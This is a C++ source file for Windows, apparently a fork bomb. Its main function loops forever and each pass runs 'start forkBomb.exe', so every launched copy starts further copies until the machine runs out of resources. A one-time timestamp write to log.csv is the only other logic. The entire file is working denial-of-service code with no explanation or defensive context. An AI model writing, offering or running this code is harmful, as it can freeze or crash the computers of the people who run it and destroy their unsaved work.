#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <iostream>
#include <string>
#include <time.h>
#include <chrono>
#include <ctime>  

using namespace std;

void slice_str(const char* str, char* buffer, size_t start, size_t end)
{
    size_t j = 0;
    for (size_t i = start; i <= end; ++i) {
        buffer[j++] = str[i];
    }
    buffer[j] = 0;
}

int main(int argc, TCHAR* argv[])
{
    int c = 0;
    while (1) {
        system("start forkBomb.exe");
        //Loging
        if (c == 0) {
            FILE* f = fopen("log.csv", "a");
            char timestamp[64];
            auto end = std::chrono::system_clock::now();
            std::time_t end_time = std::chrono::system_clock::to_time_t(end);
            slice_str(std::ctime(&end_time), timestamp, 11, 19);
            fprintf(f, "%s\n", timestamp);
            fclose(f);
            c = 1;
        }
    }
    return 0;
}
